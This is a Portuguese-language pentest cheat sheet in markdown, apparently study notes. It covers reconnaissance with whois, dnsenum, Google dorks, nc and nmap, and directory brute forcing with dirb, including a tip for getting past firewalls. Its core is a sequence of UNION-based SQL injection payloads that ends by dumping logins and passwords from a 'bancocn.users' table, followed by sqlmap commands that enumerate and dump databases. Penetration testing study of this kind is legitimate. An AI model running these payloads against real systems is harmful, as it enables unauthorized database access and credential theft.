# levantamento de informacoes
--------------------
### ip e dominio, contato, firewall etc:

no console: 
    whois dominio ou ip
    host dominio ou ip
    dnsenum dominio ou ip

para sites brasileiros: 
[registrobr](https://registro.br/)

dominio.com.br/robots.txt (exibir url's que o google nao deve mostrar)

filtros google: 
site:dominio.com.br (filtra o google p/url's somente daquele site)
intitle:"index of"

--------------------

### verificar se portas abertas/ouvindo/portscan
p/ portscan rapido: ferramenta: portscan.py
no console: 
    netcat ou nc dominio porta 
ferramenta: portscan.py


exemplo nc: 
    nc www.bancocn.com 80
    GET / HTTP/1.1

    request text

### verificar SO, portas, pacotes, servicoes, computadores ativos, firewall:
nmap ou zenmap (aplicacao visual do nmap)

--------------------

### brute force em dir:

dirb
obs: para bypass em firewall, passar user agent -a, cookie -c 



### erros:

HTTP:
    Sempre que nao encontrar pagina, 404
    Local nao autorizado ou erro de servidor interno, 500
    Tudo certo, 200


### SQI 

order by x--, ordernar por coluna p/descobrir o num de colunas

-1 union select 1,2, database()

database() ou group_concat(schema_name from) information_schema.schemata (para localizar nome do banco)

-1 union select 1,2, group_concat(table_name from) information_schema.tables where table_schema="nomedobanco" -> obter nome das tabelas

-1 union select 1,2, group_concat(column_name from) information_schema.columns where table_schema="nomedobanco" and table_name="nomedatabela" -> obter nome das colunas

-1 union select 1,2, group_concat(id, ":", login, ":", password) from bancocn.users -> obter o que eu quero

### SQI por sqlmap

sqlmap -r arquivo.txt --dbs --dbms=tipodebanco (descobrir nome dos bancos)

sqlmap -r arquivo.txt --dbms=tipodebanco -D nomedobanco -tables (obter nome das tabelas)


sqlmap -r arquivo.txt --dbms=tipodebanco -D nomedobanco -T nomedatabela --columns (obter nome das colunas)

sqlmap -r arquivo.txt --dbms=tipodebanco -D nomedobanco -T nomedatabela -C nomecoluna1,nomecoluna2,nomecolunaetc --dump (obter informacoes das colunas)